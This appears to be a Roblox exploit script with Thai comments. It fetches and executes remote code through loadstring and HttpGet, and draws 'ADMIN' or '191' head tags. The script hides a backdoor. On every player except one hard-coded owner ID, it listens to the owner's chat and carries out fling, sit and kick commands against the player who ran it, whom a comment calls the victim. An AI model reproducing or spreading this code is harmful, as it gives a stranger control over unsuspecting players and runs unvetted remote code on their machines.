local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local OwnerID = 1697390697 -- UserId

-- [ ฟังก์ชันสร้างป้ายบนหัว ]
local function CreateTag(targetPlayer, text, color, trans)
    targetPlayer.CharacterAdded:Connect(function(char)
        local head = char:WaitForChild("Head", 5)
        if not head then return end
        
        local bgui = Instance.new("BillboardGui", head)
        bgui.Name = "AdminTag"
        bgui.Size = UDim2.new(0, 100, 0, 50)
        bgui.StudsOffset = Vector3.new(0, 3, 0)
        bgui.AlwaysOnTop = true
        
        local frame = Instance.new("Frame", bgui)
        frame.Size = UDim2.new(1, 0, 0.6, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0) -- สีดำ
        frame.BackgroundTransparency = trans
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        
        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = color
        label.TextSize = 18
        label.Font = Enum.Font.GothamBold
    end)
end

-- [ ระบบคำสั่งสำหรับเครื่องเหยื่อ ]
local function ExecuteFling()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local bV = Instance.new("BodyVelocity", hrp)
        bV.Velocity = Vector3.new(0, 1000, 0) -- พุ่งขึ้นฟ้า
        local bA = Instance.new("BodyAngularVelocity", hrp)
        bA.AngularVelocity = Vector3.new(5000, 5000, 5000) -- หมุนติ้ว
        task.wait(1)
        bV:Destroy()
        bA:Destroy()
    end
end

-- [ ระบบดักฟังแชทจากเจ้าของ ]
local function ListenToOwner(player)
    player.Chatted:Connect(function(msg)
        if player.UserId == OwnerID then
            local args = string.split(msg:lower(), " ")
            local cmd = args[1]
            local target = args[2]
            
            if target and string.find(LocalPlayer.Name:lower(), target) then
                if cmd == "!fling" then
                    ExecuteFling()
                elseif cmd == "!sit" then
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid.Sit = true
                    end
                elseif cmd == "!kick" then
                    LocalPlayer:Kick("โดนสั่งเตะโดย Admin 191")
                end
            end
        end
    end)
end

-- ตรวจสอบสิทธิ์และสร้างป้าย
if LocalPlayer.UserId == OwnerID then
    CreateTag(LocalPlayer, "ADMIN", Color3.fromRGB(255, 255, 255), 0.2)
else
    CreateTag(LocalPlayer, "191", Color3.fromRGB(255, 255, 255), 0.5)
    -- คนทั่วไปต้องรอฟังคำสั่งจากน้อง
    for _, p in pairs(Players:GetPlayers()) do ListenToOwner(p) end
    Players.PlayerAdded:Connect(ListenToOwner)
end

